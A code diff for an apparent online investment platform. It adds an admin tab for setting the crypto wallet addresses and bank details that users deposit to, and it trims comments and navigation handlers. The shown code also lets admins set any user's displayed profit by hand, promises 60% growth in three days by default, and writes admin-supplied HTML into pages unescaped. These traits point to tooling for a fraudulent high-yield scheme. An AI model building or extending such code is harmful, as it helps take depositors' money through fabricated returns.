             const newBalance = currentUser.balance - amount;
             
-            // Create investment object
             const investment = {
                 plan,
                 amount,
                 date: new Date().toISOString(),
-                profit: 0 // initial profit
+                profit: 0
             };
 
-            // Update user's investments array
             const investments = currentUser.investments || [];
             investments.push(investment);
             
@@ -2089,6 +2256,7 @@
             document.getElementById('depositsTab').style.display = 'none';
             document.getElementById('withdrawalsTab').style.display = 'none';
             document.getElementById('investmentsTab').style.display = 'none';
+            document.getElementById('paymentTab').style.display = 'none';
             document.getElementById('settingsTab').style.display = 'none';
             
             if (tab === 'users') {
@@ -2118,7 +2286,7 @@
                     html += `<div class="user-list-item">
                         <div>
                             <strong>${d.userName}</strong><br>
-                            Amount: $${d.amount} - ${d.currency}
+                            Amount: $${d.amount} - Method: ${d.method}
                         </div>
                         <button class="btn btn-success btn-sm" onclick="confirmDeposit('${doc.id}', '${d.userId}', ${d.amount})">Confirm</button>
                     </div>`;
@@ -2143,7 +2311,6 @@
                 });
                 document.getElementById('withdrawalsList').innerHTML = html;
 
-                // Load withdrawal instructions
                 const settingsDoc = await db.collection('settings').doc('withdrawals').get();
                 if (settingsDoc.exists) {
                     document.getElementById('withdrawalInstructionsInput').value = settingsDoc.data().instructions || '';
@@ -2154,7 +2321,6 @@
 
             if (tab === 'investments') {
                 document.getElementById('investmentsTab').style.display = 'block';
-                // Load all users' investments
                 const users = await db.collection('users').get();
                 let html = '';
                 for (const userDoc of users.docs) {
@@ -2179,12 +2345,29 @@
                 if (html === '') html = '<p>No active investments found.</p>';
                 document.getElementById('adminInvestmentsList').innerHTML = html;
 
-                // Load investment message
                 const msgDoc = await db.collection('settings').doc('investmentMessage').get();
                 if (msgDoc.exists) {
                     document.getElementById('investmentMessageInput').value = msgDoc.data().message || '';
                 } else {
                     document.getElementById('investmentMessageInput').value = 'Your investment will grow with 60% in the next 3 days.';
+                }
+            }
+
+            if (tab === 'payment') {
+                document.getElementById('paymentTab').style.display = 'block';
+                // Load current payment settings
+                const paymentDoc = await db.collection('settings').doc('payment').get();
+                if (paymentDoc.exists) {
+                    const data = paymentDoc.data();
+                    document.getElementById('btcAddressInput').value = data.btc || '';
+                    document.getElementById('ethAddressInput').value = data.eth || '';
+                    document.getElementById('usdtAddressInput').value = data.usdt || '';
+                    document.getElementById('bankDetailsInput').value = data.bank || '';
+                } else {
+                    document.getElementById('btcAddressInput').value = paymentSettings.btc;
+                    document.getElementById('ethAddressInput').value = paymentSettings.eth;
+                    document.getElementById('usdtAddressInput').value = paymentSettings.usdt;
+                    document.getElementById('bankDetailsInput').value = paymentSettings.bank;
                 }
             }
 
@@ -2227,7 +2410,6 @@
         };
 
         window.approveWithdrawal = async (withdrawalId, userId, amount) => {
-            // Deduct from user balance
             const user = await db.collection('users').doc(userId).get();
             const newBalance = (user.data().balance || 0) - amount;
             await db.collection('users').doc(userId).update({ balance: newBalance });
@@ -2237,13 +2419,12 @@
         };
 
         window.openEditProfitModal = (userId, investmentIndex, userName, plan, amount, currentProfit) => {
-            document.getElementById('editInvestmentId').value = userId; // we'll use userId and index to identify
+            document.getElementById('editInvestmentId').value = userId;
             document.getElementById('editInvestmentUserId').value = userId;
             document.getElementById('editInvestmentUser').value = userName;
             document.getElementById('editInvestmentPlan').value = plan;
             document.getElementById('editInvestmentAmount').value = amount;
             document.getElementById('editInvestmentProfit').value = currentProfit;
-            // Store index in a data attribute or global var
             window.currentEditInvestmentIndex = investmentIndex;
             showModal('editProfitModal');
         };
@@ -2254,7 +2435,6 @@
             const newProfit = parseFloat(document.getElementById('editInvestmentProfit').value);
             const index = window.currentEditInvestmentIndex;
 
-            // Get user
             const userRef = db.collection('users').doc(userId);
             const userDoc = await userRef.get();
             const userData = userDoc.data();
@@ -2263,11 +2443,9 @@
                 return;
             }
 
-            // Update profit
             userData.investments[index].profit = newProfit;
             await userRef.update({ investments: userData.investments });
 
-            // If this is the current user, update local
             if (currentUser && currentUser.id === userId) {
                 currentUser.investments = userData.investments;
                 updateUserUI();
@@ -2288,15 +2466,29 @@
             const message = document.getElementById('investmentMessageInput').value;
             await db.collection('settings').doc('investmentMessage').set({ message });
             showToast('Investment message saved.', 'success', 'Admin Action');
-            // Update display if on user dashboard
             document.getElementById('investmentMessage').innerHTML = message;
+        };
+
+        window.savePaymentSettings = async () => {
+            const btc = document.getElementById('btcAddressInput').value;
+            const eth = document.getElementById('ethAddressInput').value;
+            const usdt = document.getElementById('usdtAddressInput').value;
+            const bank = document.getElementById('bankDetailsInput').value;
+            await db.collection('settings').doc('payment').set({ btc, eth, usdt, bank });
+            // Update local cache
+            paymentSettings = { btc, eth, usdt, bank };
+            showToast('Payment settings saved.', 'success', 'Admin Action');
+            // If deposit section is visible, update displayed details
+            if (document.getElementById('walletSection').classList.contains('active')) {
+                updateMethodDetails(document.getElementById('selectedMethod').value);
+            }
         };
 
         window.savePromoBanner = async () => {
             const html = document.getElementById('promoBannerInput').value;
             await db.collection('settings').doc('promo').set({ html });
             showToast('Promo banner saved.', 'success', 'Admin Action');
-            loadPromoBanner(); // reload on public pages
+            loadPromoBanner();
         };
 
         // ===== LOAD PROMO BANNER =====
@@ -2329,6 +2521,18 @@
             }
         }
 
+        // ===== LOAD PAYMENT SETTINGS =====
+        async function loadPaymentSettings() {
+            const paymentDoc = await db.collection('settings').doc('payment').get();
+            if (paymentDoc.exists) {
+                paymentSettings = paymentDoc.data();
+            }
+            // Update deposit page if open
+            if (document.getElementById('walletSection').classList.contains('active')) {
+                updateMethodDetails(document.getElementById('selectedMethod').value);
+            }
+        }
+
         // ===== COPY REFERRAL CODE =====
         window.copyReferralCode = () => {
             navigator.clipboard.writeText(document.getElementById('userReferralCode').textContent);
@@ -2337,6 +2541,7 @@
 
         // ===== CHECK LOGIN =====
         async function checkLogin() {
+            await loadPaymentSettings(); // always load payment settings
             if (currentUserId) {
                 const user = await db.collection('users').doc(currentUserId).get();
                 if (user.exists) {
@@ -2349,41 +2554,20 @@
                     loadWithdrawalInstructions();
                     loadInvestmentMessage();
                 } else {
-                    // Invalid user ID, clear storage
                     localStorage.removeItem('currentUserId');
-                    updateUserUI(); // will show login buttons
+                    updateUserUI();
                 }
             } else {
-                updateUserUI(); // show login buttons when logged out
+                updateUserUI();
             }
-            loadPromoBanner(); // always load promo banner for public
+            loadPromoBanner();
         }
         checkLogin();
 
-        // ===== NAVIGATION =====
+        // ===== NAVIGATION (public) =====
         document.getElementById('homeLink').addEventListener('click', (e) => {
             e.preventDefault();
             showPage('landingPage');
-        });
-
-        document.getElementById('homeNav').addEventListener('click', (e) => {
-            e.preventDefault();
-            showPage('landingPage');
-        });
-
-        document.getElementById('aboutNav').addEventListener('click', (e) => {
-            e.preventDefault();
-            showPage('aboutPage');
-        });
-
-        document.getElementById('plansNav').addEventListener('click', (e) => {
-            e.preventDefault();
-            showPage('landingPage');
-        });
-
-        document.getElementById('referralNav').addEventListener('click', (e) => {
-            e.preventDefault();
-            showPage('referralPage');
         });
 
         document.getElementById('getStartedBtn').addEventListener('click', () => {
@@ -2414,52 +2598,8 @@
             showPage('signupPage');
         });
 
-        document.getElementById('logoutBtn').addEventListener('click', () => {
-            localStorage.removeItem('currentUserId');
-            currentUser = null;
-            updateUserUI(); // shows login buttons again
-            showPage('landingPage');
-            showToast('Logged out successfully', 'info', 'Goodbye');
-        });
-
-        document.getElementById('adminPanelBtn').addEventListener('click', (e) => {
-            e.preventDefault();
-            showPage('adminPanel');
-            showAdminTab('users');
-        });
-
         document.getElementById('backToUserDashboard').addEventListener('click', () => {
             showPage('userDashboard');
-        });
-
-        // Dashboard navigation
-        document.querySelectorAll('.sidebar-menu a').forEach(link => {
-            link.addEventListener('click', (e) => {
-                e.preventDefault();
-                
-                document.querySelectorAll('.sidebar-menu a').forEach(a => a.classList.remove('active'));
-                link.classList.add('active');
-                
-                const page = link.dataset.page;
-                document.querySelectorAll('.dashboard-section').forEach(section => {
-                    section.classList.remove('active');
-                });
-                
-                if (page === 'overview') document.getElementById('overviewSection').classList.add('active');
-                if (page === 'invest') document.getElementById('investSection').classList.add('active');
-                if (page === 'wallet') document.getElementById('walletSection').classList.add('active');
-                if (page === 'withdraw') {
-                    document.getElementById('withdrawSection').classList.add('active');
-                    loadWithdrawalInstructions();
-                }
-                if (page === 'referral') document.getElementById('referralSection').classList.add('active');
-                if (page === 'portfolio') {
-                    document.getElementById('portfolioSection').classList.add('active');
-                    loadActiveInvestments();
-                    loadInvestmentMessage();
-                }
-                if (page === 'settings') document.getElementById('settingsSection').classList.add('active');
-            });
         });
 
         // Close modals
